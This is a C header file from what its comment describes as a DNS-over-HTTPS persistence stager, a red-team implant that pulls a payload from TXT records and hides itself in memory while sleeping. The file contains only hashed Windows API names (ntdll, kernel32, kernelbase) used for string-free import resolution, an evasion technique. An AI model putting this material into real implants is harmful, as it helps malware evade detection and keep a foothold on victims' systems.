/*-
 *
 * dns over http(s) persistence stager.
 * grabs a binary payload over a txt
 * record before going back to sleep
 * for a specified time.
 *
 * before going to sleep, it will try
 * to obfuscate itself in memory and
 * hide its return address.
 *
 * Copyright (c) 2021 Austin Hudson
 * Copyright (c) 2021 GuidePoint Security LLC
 *
-*/

#ifndef _HASHES_H_
#define _HASHES_H_

#define H_NTSIGNALANDWAITFORSINGLEOBJECT	0x78983aed
#define H_NTQUERYINFORMATIONPROCESS		0x8cdc5dc2
#define H_NTPROTECTVIRTUALMEMORY		0x50e92888
#define H_NTWAITFORSINGLEOBJECT			0xe8ac0c3c
#define H_NTDEVICEIOCONTROLFILE			0x05d57dd0
#define H_RTLINITUNICODESTRING			0xef52b589
#define H_NTALERTRESUMETHREAD			0x5ba11e28
#define H_NTSETCONTEXTTHREAD			0xffa0bf10
#define H_NTGETCONTEXTTHREAD			0x6d22f884
#define H_RTLEXITUSERTHREAD			0x2f6db5e8
#define H_NTTERMINATETHREAD			0xccf58808
#define H_RTLCAPTURECONTEXT			0xeba8d910	
#define H_NTDELAYEXECUTION			0xf5a936aa
#define H_NTQUEUEAPCTHREAD			0x0a6664b8
#define H_NTCREATETHREADEX			0xaf18cfb0
#define H_RTLALLOCATEHEAP			0x3be94c5a
#define H_NTCREATEEVENT				0x28d3233d
#define H_NTOPENTHREAD				0x968e0cb1
#define H_RTLFREEHEAP				0x73a9e4d7
#define H_NTTESTALERT				0x858a32df
#define H_NTOPENFILE				0x46dde739
#define H_NTCONTINUE				0xfc3a6c2c
#define H_EXITTHREAD				0x2f6db5e8
#define H_NTCLOSE				0x40d6e69d
#define H_NTDLL					0x1edab0ed			

#define H_SETPROCESSVALIDCALLTARGETS		0x647d9236
#define H_KERNELBASE				0x03ebb38b

#define H_LOCALFILETIMETOFILETIME		0x75b9ce51
#define H_SYSTEMTIMETOFILETIME			0x61d8126b
#define H_KERNEL32				0x6ddb9555

#endif
